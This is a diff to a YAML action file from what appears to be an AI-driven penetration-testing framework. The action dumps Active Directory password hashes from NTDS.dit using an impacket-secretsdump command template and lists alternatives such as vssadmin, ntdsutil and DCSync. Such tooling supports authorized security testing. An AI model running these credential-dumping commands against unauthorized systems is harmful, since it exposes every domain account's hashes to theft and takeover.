@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM
-  LOCAL
+command_template: impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL
 parser: generic_parser
 expected_effects:
 - ntds_dumped
@@ -17,7 +16,17 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: '**Mechanism**: NTDS.dit on a DC contains every account hash. Methods:
-  `secretsdump -ntds`, `vssadmin → NTDS.dit copy`, `ntdsutil snapshot`, or DCSync
-  (no DC compromise needed). **TAR action**: `actions/ad/secretsdump.yml`, `actions/ad/dcsync.yml`'
+mechanism: "**Mechanism**: NTDS.dit on a DC contains every account hash. Methods: `secretsdump -ntds`, `vssadmin \u2192 NTDS.dit\
+  \ copy`, `ntdsutil snapshot`, or DCSync (no DC compromise needed). **TAR action**: `actions/ad/secretsdump.yml`, `actions/ad/dcsync.yml`"
 hacktricks_ref: windows-hardening/stealing-credentials/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 0568806739
+  - 22492c286e
+  - 466c9c04ed
+  - 4996b99668
+  - 856d296d63
+  - 94ae2a83d5
+  - c1ea24a971
+  - ccaa0064a5
+  - dac0a76ff7
